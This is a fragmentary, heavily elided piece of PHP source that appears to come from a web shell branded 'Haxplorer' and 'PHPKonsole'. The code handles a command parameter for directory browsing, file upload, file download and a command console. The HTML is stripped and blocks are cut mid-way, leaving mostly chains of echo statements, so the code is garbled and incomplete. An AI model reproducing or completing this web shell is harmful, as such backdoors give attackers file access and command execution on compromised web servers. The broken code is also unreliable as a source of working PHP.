...
if ($cmd != "downl") {
	?><?php echo $scriptident ?><?php echo $scriptver ?><?php echo $scriptdate ?><?php echo $SFileName ?><?php echo $scriptident ?><?php echo $scriptver ?><?php echo $scriptdate ?><?php
}
...
if ( $cmd=="dir" ) {
    ...
    ?><?php echo "$SFileName?$urlAdd"; ?><?php echo $partdir ?><?php
...
elseif ( $cmd=="upload" ) { /* <!-- Upload File form --> */ 
   	?><?php echo "$SFileName?$urlAdd" ?><?php echo $dir ?><?php echo $lastcmd ?><?php echo $lastdir ?><?php echo "$SFileName?$urlAdd" ?><?php echo $lastcmd ?><?php echo $lastdir ?><?php
}
...
?><?php echo "$PHP_SELF?$urlAdd" ?><?php
	...
	closedir($dir_handle);
	?><?php if (($stderr) || (!isset($stderr)) ) echo " CHECKED"; ?><?php
	    if (!empty($command)) {
	...
	$isMainMenu = true;
     ?><?php echo $scriptTitle ?><?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> Haxplorer <==</strong></font>", "cmd=dir&dir=.").sp(2); ?><?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> PHPKonsole <==</strong></font>", "cmd=con").sp(2); ?><?php
}

if ($cmd != "downl") {
	if ( $isMainMenu != true) {
 		?><?php echo buildUrl("<font color=\"navy\">[&nbsp;Main Menu&nbsp;]  </font>", "cmd=&dir=");      ?><?php echo buildUrl("<font color=\"navy\">[&nbsp;PHPKonsole&nbsp;] </font>", "cmd=con");        ?><?php echo buildUrl("<font color=\"navy\">[&nbsp;Haxplorer&nbsp;]  </font>", "cmd=dir&dir=.");  ?><?php
}
	?><?php echo $scriptident ?><?php echo $scriptver ?><?php echo $scriptdate ?><?php
 }
